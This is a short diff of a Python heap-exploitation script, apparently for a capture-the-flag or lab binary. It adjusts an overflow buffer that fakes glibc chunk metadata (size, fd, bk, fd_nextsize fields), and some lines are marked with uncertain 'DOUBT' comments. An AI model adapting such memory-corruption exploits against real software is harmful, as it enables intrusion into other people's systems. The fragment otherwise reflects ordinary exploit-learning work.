@@ -79,9 +79,9 @@ overflow += "B"*8			# JUNK
 overflow += struct.pack("<Q",0x420)	# prevsize
 overflow += struct.pack("<Q",0x100)	# size
 overflow += struct.pack("<Q",0)*4	# fd ; bk ; fd_nextsize ; bk_nextsize
-overflow += "A"*8*24			## DOUBT
-overflow += struct.pack("<Q",0x0)	## DOUBT imagenory prevsize
-overflow += struct.pack("<Q",0x1)	# imagenory size
+overflow += "A"*8*27			## DOUBT
+overflow += struct.pack("<Q",0x21)	## DOUBT imagenory size
+overflow += struct.pack("<Q",0x1)*4	# imagenory fd;bk;fd_nextsize;bk_nextsize
 
 change_memory(2,structs)
 change_memory(3,overflow)
